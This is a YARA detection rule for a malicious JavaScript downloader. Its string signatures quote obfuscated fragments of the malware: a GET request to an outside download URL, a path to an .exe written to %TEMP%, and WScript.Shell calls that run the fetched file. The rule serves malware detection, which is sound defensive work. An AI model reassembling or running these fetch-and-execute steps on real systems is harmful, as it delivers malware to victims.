rule sig_20160328_589cb131836e979506caac2df1ddffb5 {
  meta:
    description = "datamaliciousorder - file 20160328_589cb131836e979506caac2df1ddffb5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0c7fc38f986ae7ac4b91ae35a67cc0e4d73e0d831fafe8bba6b3c91b5663965c"

  strings:
    $s1  = "function Yxneduji() {return Xxxvyegkmv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"LTDOw9x3i9lD.exe\";};" fullword ascii
    $s2  = "do {WScript[Ccbmy](Kpqugug() * 11)} while (Buyrwko[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Buyrwko[Djumoyzbu](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s4  = "function Nctpy(Nuqeyz, Daojwqhnb){return Nuqeyz - Daojwqhnb;};" fullword ascii
    $s5  = "var Xxxvyegkmv = function Kfjwc() {return WScript[Czadygqfv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ebpgdypkn(Rtfhnmil){Xxxvyegkmv[\"Run\"](Rtfhnmil, Arkyq, Arkyq);};" fullword ascii
    $s7  = "function Vsxcqun() {return ((Tbbpkjzsfl == true) && (Tbbpkjzsfl == Zeclmy)) ? 1 : Arkyq;};" fullword ascii
    $s8  = "function Itcstgn(){return Czadygqfv;};" fullword ascii
    $s9  = "var Tbbpkjzsfl = false;" fullword ascii
    $s10 = "Tbbpkjzsfl = true; " fullword ascii
    $s11 = "var Zeclmy = false;" fullword ascii
    $s12 = "var Jmsto = new this[\"Date\"]();" fullword ascii
    $s13 = "function Qxroa(Ohrnxprczd) {var Qbsvczdj = (1, 2, 3, 4, 5, Ohrnxprczd); return Qbsvczdj;};" fullword ascii
    $s14 = "var Adghu = false;" fullword ascii
    $s15 = "return Nctpy(Gkiuk, Mtvpo);" fullword ascii
    $s16 = " while (Nmyghkpv){" fullword ascii
    $s17 = "function Hmzobkqlf(){return Xgrpeuijil;};" fullword ascii
    $s18 = "Zeclmy = true; " fullword ascii
    $s19 = "function Kpqugug(){return 22;};" fullword ascii
    $s20 = "function Gyoasdq()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}